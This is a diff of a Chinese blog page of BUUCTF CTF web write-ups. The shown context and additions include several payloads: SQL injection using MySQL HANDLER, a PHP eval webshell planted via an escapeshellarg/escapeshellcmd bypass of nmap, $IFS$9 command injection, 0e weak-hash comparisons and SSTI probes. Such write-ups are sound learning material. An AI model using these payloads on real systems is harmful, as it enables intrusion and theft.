@@ -487,21 +487,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-05-02
+                    2022-05-27
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    35k
+                    35.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    165 分
+                    168 分
                 </div>
                 
 
@@ -928,7 +928,6 @@ $&#123;IFS替换
 <pre class="language-none"><code class="language-none">在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，具体定义可以[参考Tornado官方文档](http:&#x2F;&#x2F;tornado.readthedocs.org&#x2F;en&#x2F;latest&#x2F;guide&#x2F;templates.html#template-syntax)！</code></pre>
 
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135655762.png" alt="image-20210723135655762"></p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723134312675.png" alt="image-20210723134312675"></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723135914756.png" alt="image-20210723135914756"></p>
 <p>所以可以利用这个来读取cookie_secret</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210723140608282.png" alt="image-20210723140608282"></p>
@@ -1186,7 +1185,7 @@ PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器�
 <p>这里可以利用headler</p>
 <p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
 <p>最终payload：1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p>
-<p>（试了一下利用headler强网杯的拿到也能注出来</p>
+<p>（试了一下利用headler强网杯的那道也能注出来</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210725231720309.png" alt="image-20210725231720309"></p>
 <p><strong>关于handler命令</strong><br>转载自:<a target="_blank" rel="noopener" href="https://blog.csdn.net/jesseyoung/article/details/40785137">https://blog.csdn.net/jesseyoung/article/details/40785137</a></p>
 <p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</p>
@@ -1207,14 +1206,14 @@ HANDLER tbl_name CLOSE</code></pre>
 <p>通过索引列指定一个值，可以指定从哪一行开始。<br>通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。</p>
 <p>如果我们不想浏览一个表的所有行，可以使用where和limit子句。</p>
 <h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>这个和之前一个文件上传的题差不多，上传时过滤了ph后缀名，所以要上传个图片马，同时还要上传个.htaccess文件解析图片马，用bp抓包把类型改成image/jpeg就行</p>
-<p>然后菜刀练一下在根目录里就能找到flag</p>
+<p>然后菜刀连一下在根目录里就能找到flag</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210803230538636.png" alt="image-20210803230538636"></p>
 <h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>先直接贴参考的文章了</p>
-<p>[BUUCTF__<a target="_blank" rel="noopener" href="https://blog.csdn.net/tm_1024/article/details/107393796?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">BUUCTF 2018]Online Tool_题解_风过江南乱的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/tm_1024/article/details/107393796?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-0.control&spm=1001.2101.3001.4242">BUUCTF 2018]Online Tool_题解_风过江南乱的博客-CSDN博客</a></p>
 <p>[<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102835099?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">BUUCTF 2018]Online Tool_沐目的博客-CSDN博客</a></p>
 <p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/#2-CVE-2016-10045">谈谈escapeshellarg参数绕过和注入的问题 (lmxspace.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">PHP escapeshellarg()+escapeshellcmd() 之殇 (seebug.org)</a></p>
-<p>[2020/7/08 - <a target="_blank" rel="noopener" href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167/">BUUCTF 2018]Online Tool - nmap\escapeshellarg与escapeshellcmd连用_M4xlmum的博客-CSDN博客</a></p>
+<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/zhangxiansheng12/article/details/107216167/">BUUCTF 2018]Online Tool - nmap\escapeshellarg与escapeshellcmd连用_M4xlmum的博客-CSDN博客</a></p>
 <p>先是代码审计，又是没见过的东西</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804001517374.png" alt="image-20210804001517374"></p>
 <p>第一个if语句好像没啥用</p>
@@ -1224,8 +1223,9 @@ HANDLER tbl_name CLOSE</code></pre>
 <p>不过要注意的事，并不是每个代理服务器都能用 $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;] 来读取客户端的真实IP，有些用此</p>
 <p>方法读取到的仍然是代理服务器的 IP。</p>
 <p>第二个if语句是要求传入一个参数然后利用escapeshellarg和escapeshellcmd两个函数的漏洞实现system命令执行</p>
-<pre class="language-none"><code class="language-none">&#96;escapeshellarg&#96;，会在字符串中所有的单引号（包括成对存在闭合的）前添加一个&#96;&#39;\&#39;&#96; ，若已经用&#96;\&#96;转义，则会用并且用&#96;&#39;\&#39;&#96; 替换&#96;\&#96;，最后将整个变量用单引号包裹。
-escapeshellcmd&#96;，会将字符串中未被转义的双引号或单引号转义（成对存在闭合的双引号或单引号除外）若已被转义，则用&#96;\\\&quot;&#96;或&#96;\\\&#39;&#96;替&#96;\&quot;&#96;或&#96;\&#39;</code></pre>
+<pre class="language-txt" data-language="txt"><code class="language-txt">escapeshellarg，会在字符串中所有的单引号（包括成对存在闭合的）前添加一个&#39;\&#39; ，若已经用\转义，则会用&#39;\&#39;&#96;替换\，最后将整个变量用单引号包裹。
+
+escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。反斜线（\）会在以下字符之前插入： &amp;#;&#96;|\?~&lt;&gt;^()[]&#123;&#125;$*, \x0A 和 \xFF*。 *’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</code></pre>
 
 <p>这个漏洞类似这种</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210804005109985.png" alt="image-20210804005109985"></p>
@@ -1240,10 +1240,10 @@ escapeshellcmd&#96;，会将字符串中未被转义的双引号或单引号转�
 <p>-oG test.txt: 将扫描结果生成 test.txt 文件</p>
 <p>接下来就是想办法利漏洞给里面传入一个一句话木马</p>
 <p>payload</p>
-<pre class="language-none"><code class="language-none">&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;</code></pre>
+<pre class="language-txt" data-language="txt"><code class="language-txt">&#39;&lt;?php eval($_POST[&quot;a&quot;]);?&gt; -oG 1.php &#39;</code></pre>
 
 <p>然后经过escapeshellarg和escapeshellcmd两个函数就会变成类似这种</p>
-<pre class="language-none"><code class="language-none">&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></pre>
+<pre class="language-txt" data-language="txt"><code class="language-txt">&#39; &#39;\\&#39;&#39;\&lt;\?php eval\(\)\;\?\&gt; -oG 1.php &#39;\\&#39;&#39; &#39;</code></pre>
 
 <p>这里单引号都闭合了不会影响到传入的一句话木马</p>
 <p>之后就可以用菜刀连接找flag了</p>
@@ -1269,10 +1269,10 @@ escapeshellcmd&#96;，会将字符串中未被转义的双引号或单引号转�
 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre>
 
 <p>漏洞成因</p>
-<pre class="language-none"><code class="language-none">通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^&#x2F;WEB-INF&#x2F;* &#123; deny all; &#125; 或者return 404; 或者其他！</code></pre>
+<pre class="language-txt" data-language="txt"><code class="language-txt">通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^&#x2F;WEB-INF&#x2F;* &#123; deny all; &#125; 或者return 404; 或者其他！</code></pre>
 
 <p>漏洞利用</p>
-<pre class="language-none"><code class="language-none">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre>
+<pre class="language-txt" data-language="txt"><code class="language-txt">漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码</code></pre>
 
 <p>所以先访问一下WEB-INF/web.xml</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808125056946.png" alt="image-20210808125056946"></p>
@@ -1282,8 +1282,8 @@ escapeshellcmd&#96;，会将字符串中未被转义的双引号或单引号转�
 <p>看到有块类似base64</p>
 <p>解码得到flag</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808131703878.png" alt="image-20210808131703878"></p>
-<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>[(1条消息) BUU-WEB-<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_24033605/article/details/116855740?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">GXYCTF2019]禁止套娃_TzZzEZ-web的博客-CSDN博客</a></p>
-<p>[<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p>
+<h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_24033605/article/details/116855740?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">GXYCTF2019]禁止套娃_TzZzEZ-web的博客-CSDN博客</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12260986.html">GXYCTF2019]禁止套娃 - 王叹之 - 博客园 (cnblogs.com)</a></p>
 <p>题目存在git泄露，用GitHack扫一下得到源码</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210808134953571.png" alt="image-20210808134953571"></p>
 <p>可以猜到这里利用了eval进行命令执行，但是过滤了很多东西</p>
@@ -1382,7 +1382,7 @@ current() 返回数组中的当前单元, 默认取第一个值</code></pre>
 <p>最终payload为?\S*={${getFlag()}}&amp;cmd=system(&quot;cat /flag&quot;);</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210809001841771.png" alt="image-20210809001841771"></p>
 <h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>整吐了知道是git泄露但是用githack扫完之后就是没有源码。。。</p>
-<p>接一下百度的wp的源码</p>
+<p>借一下百度的wp的源码</p>
 <p>index.php</p>
 <pre class="language-none"><code class="language-none">&lt;?php
 include &#39;flag.php&#39;;
@@ -1477,38 +1477,38 @@ $flag &#x3D; file_get_contents(&#39;&#x2F;flag&#39;);</code></pre>
 <p>这里用了call_user_func函数，也就是func是函数名，p是参数</p>
 <p>用system试时发现被过滤了，发现file_get_contents函数可以用</p>
 <p>file_get_contents拿源码</p>
-<pre><code>&lt;?php
-$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+$disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);
 function gettime($func, $p) &#123;
-    $result = call_user_func($func, $p);
-    $a= gettype($result);
-    if ($a == &quot;string&quot;) &#123;
+    $result &#x3D; call_user_func($func, $p);
+    $a&#x3D; gettype($result);
+    if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;
         return $result;
     &#125; else &#123;return &quot;&quot;;&#125;
 &#125;
 class Test &#123;
-    var $p = &quot;Y-m-d h:i:s a&quot;;
-    var $func = &quot;date&quot;;
+    var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;
+    var $func &#x3D; &quot;date&quot;;
     function __destruct() &#123;
-        if ($this-&gt;func != &quot;&quot;) &#123;
+        if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;
             echo gettime($this-&gt;func, $this-&gt;p);
         &#125;
     &#125;
 &#125;
-$func = $_REQUEST[&quot;func&quot;];
-$p = $_REQUEST[&quot;p&quot;];
+$func &#x3D; $_REQUEST[&quot;func&quot;];
+$p &#x3D; $_REQUEST[&quot;p&quot;];
 
-if ($func != null) &#123;
-    $func = strtolower($func);
+if ($func !&#x3D; null) &#123;
+    $func &#x3D; strtolower($func);
     if (!in_array($func,$disable_fun)) &#123;
         echo gettime($func, $p);
     &#125;else &#123;
         die(&quot;Hacker...&quot;);
     &#125;
 &#125;
-?&gt;
-</code></pre>
-<p>由于这个过滤不存在与test中，所以可以利用反序列化来执行命令</p>
+?&gt;</code></pre>
+
+<p>由于这个过滤不存在于test中，所以可以利用反序列化来执行命令</p>
 <p>利用find命令来查找文件名中有flag的文件</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224457971.png" alt="image-20210811224457971"></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210811224439715.png" alt="image-20210811224439715"></p>
@@ -1674,6 +1674,7 @@ if(isset($file))
 <p>可以试出来是twig模板，根据提示注入点应该在cookie里，抓包</p>
 <p>通过修改user内容实现注入</p>
 <p><a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#2-Twig">一篇文章带你理解漏洞之 SSTI 漏洞 | K0rz3n&#39;s Blog</a></p>
+<p>这里是twig1.x版本才有的模板注入，在2.x和3.x版本<code>__self</code> 变量在 SSTI 中早已失去了他的作用，这之后主要通过过滤器来实现攻击<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10056#toc-14">https://xz.aliyun.com/t/10056#toc-14</a></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221739824.png" alt="image-20210812221739824"></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210812221614830.png" alt="image-20210812221614830"></p>
 <p>ssti还是不太懂，毕竟我python还是没学会，遇到ssti的题我只能直接找payload，先放在这，等刷完buu第二页题目之后再回头看一遍</p>
@@ -1802,48 +1803,48 @@ def waf(param):
         return False
 </code></pre>
 
-<p>getSign：返回secert_key + param + action的哈希值<br>md5：<br>waf：禁止了flie和gopher协议</p>
-<pre><code>task类
+<p>getSign：返回secert_key + param + action的哈希值<br>md5：返回content的哈希值<br>waf：禁止了flie和gopher协议</p>
+<pre class="language-python" data-language="python"><code class="language-python">task类
 
 class Task:
     def __init__(self, action, param, sign, ip):
-        self.action = action
-        self.param = param
-        self.sign = sign
-        self.sandbox = md5(ip)
+        self.action &#x3D; action
+        self.param &#x3D; param
+        self.sign &#x3D; sign
+        self.sandbox &#x3D; md5(ip)
         if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr
             os.mkdir(self.sandbox)
 def Exec(self):
-    result = &#123;&#125;
-    result[&#39;code&#39;] = 500
+    result &#x3D; &#123;&#125;
+    result[&#39;code&#39;] &#x3D; 500
     if (self.checkSign()):
         if &quot;scan&quot; in self.action:
-            tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;w&#39;)
-            resp = scan(self.param)
-            if (resp == &quot;Connection Timeout&quot;):
-                result[&#39;data&#39;] = resp
+            tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)
+            resp &#x3D; scan(self.param)
+            if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):
+                result[&#39;data&#39;] &#x3D; resp
             else:
                 print resp
                 tmpfile.write(resp)
                 tmpfile.close()
-            result[&#39;code&#39;] = 200
+            result[&#39;code&#39;] &#x3D; 200
         if &quot;read&quot; in self.action:
-            f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#39;r&#39;)
-            result[&#39;code&#39;] = 200
-            result[&#39;data&#39;] = f.read()
-        if result[&#39;code&#39;] == 500:
-            result[&#39;data&#39;] = &quot;Action Error&quot;
+            f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)
+            result[&#39;code&#39;] &#x3D; 200
+            result[&#39;data&#39;] &#x3D; f.read()
+        if result[&#39;code&#39;] &#x3D;&#x3D; 500:
+            result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;
     else:
-        result[&#39;code&#39;] = 500
-        result[&#39;msg&#39;] = &quot;Sign Error&quot;
+        result[&#39;code&#39;] &#x3D; 500
+        result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;
     return result
 
 def checkSign(self):
-    if (getSign(self.action, self.param) == self.sign):
+    if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign):
         return True
     else:
-        return False
-</code></pre>
+        return False</code></pre>
+
 <p>checkSign：检查cookie中的sign<br>Exec：检查cookie中的action，如果scan在action中，将param的文件内容写入result.txt，如果read在action中，读出result.txt 的内容</p>
 <p>hint提示flag在flag.txt 中，想要读到他<br>首先：action=scan，param=flag.txt ，将flag.txt的内容读到result.txt中<br>然后：action=read，将result.txt的内容读出</p>
 <p>绕过点：sign<br>checkSign会检查cookie中的sign==getSign（param，action）<br>两个困难点：secert_key的值未知</p>
@@ -1985,8 +1986,36 @@ if(!isset($_GET[&#39;c&#39;]))&#123;
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37589805/article/details/116205287?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.baidujsUnder6">CISCN 2019 初赛]Love Math_分享简单的安全技术-CSDN博客</a></p>
 <h2 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828220705465.png" alt="image-20210828220705465"></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828220729509.png" alt="image-20210828220729509"></p>
+<p>level1</p>
+<blockquote>
+<p><strong>intval()</strong> 函数用于获取变量的整数值。</p>
+</blockquote>
+<p>测试：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+    $a &#x3D; &#39;2e4&#39;;
+    var_dump($a);
+    var_dump(intval($a));
+    $b &#x3D; $a + 1;
+    echo $b.&quot;\n&quot;;
+    var_dump($b);
+    var_dump(intval($b));</code></pre>
+
+<p>输出</p>
+<pre class="language-php" data-language="php"><code class="language-php">string(3) &quot;2e4&quot;
+int(2)
+20001
+float(20001)
+int(20001)</code></pre>
+
+<p>level2</p>
+<p><strong>php弱比较，php会将以0x开头的字符串，当进行==弱比较时，会认为是相同的。</strong></p>
+<p>所以就变成了找到一个以0e开头的字符串s,并且smd5(s)也是以0e开头的字符串。</p>
+<p><strong>0e215962017</strong></p>
+<p>level3</p>
+<p>**<code>$IFS$9</code>**替代空格，用其他的查看文件命令代替cat</p>
 <p>payload：</p>
-<p>？num=1e10&amp;md5=0e215962017&amp;get_flag=more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">？num&#x3D;1e10&amp;md5&#x3D;0e215962017&amp;get_flag&#x3D;more$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></pre>
+
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210828221110477.png" alt="image-20210828221110477"></p>
 <h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><pre class="language-none"><code class="language-none">
 import flask
@@ -2017,9 +2046,9 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
     app.run(debug&#x3D;True)
 </code></pre>
 
-<p>ssti注入，先试一个49</p>
+<p>ssti注入，先试一个<code>&#123;&#123;7*7&#125;&#125;</code></p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230144787.png" alt="image-20210829230144787"></p>
-<p>接下来就可以考虑在shrine下直接即可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号，但是python还有一个函数叫做url_for，其作用是url是用于构建指定函数的URL，在配合**globals()**，该函数会以字典类型返回当前位置的全部全局变量。这样也可以实现查看的效果</p>
+<p>接下来就可以考虑在shrine下直接<code>&#123;&#123;config&#125;&#125;</code>即可查看所有app.config内容，但是这题设了黑名单[&#39;config&#39;,&#39;self&#39;]并且过滤了括号，但是python还有一个函数叫做url_for，其作用是url是用于构建指定函数的URL，再配合globals，该函数会以字典类型返回当前位置的全部全局变量。这样也可以实现查看的效果</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210829230829515.png" alt="image-20210829230829515"></p>
 <p>current_app意思应该是当前app，那我们就当前app下的config：</p>
 <p>于是可以读到flag</p>
@@ -2216,7 +2245,7 @@ $user-&gt;connect($config);</code></pre>
 
 <p>这里这个过滤可以利用抓包将nickename改成数组类型来绕过</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163055572.png" alt="image-20210903163055572"></p>
-<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163139438.png" alt="image-20210903163139438"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220516175618670.png" alt="image-20220516175618670"></p>
 <p>看一下这个your profile页面</p>
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210903163211494.png" alt="image-20210903163211494"></p>
 <p>看一下这个图片的源码，是个base64加密的内容，进行解密后可以得到flag</p>
@@ -2344,9 +2373,13 @@ assert把整个字符串参数当php代码执行，eval把合法的php代码执�
 <p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204437473.png" alt="image-20210907204437473"></p>
 <p>这里admin的位置是我们的用户名，这里利用了ssl注入</p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40657585/article/details/84260844"> SSI注入漏洞_Hydra的博客-CSDN博客_ssi注入</a></p>
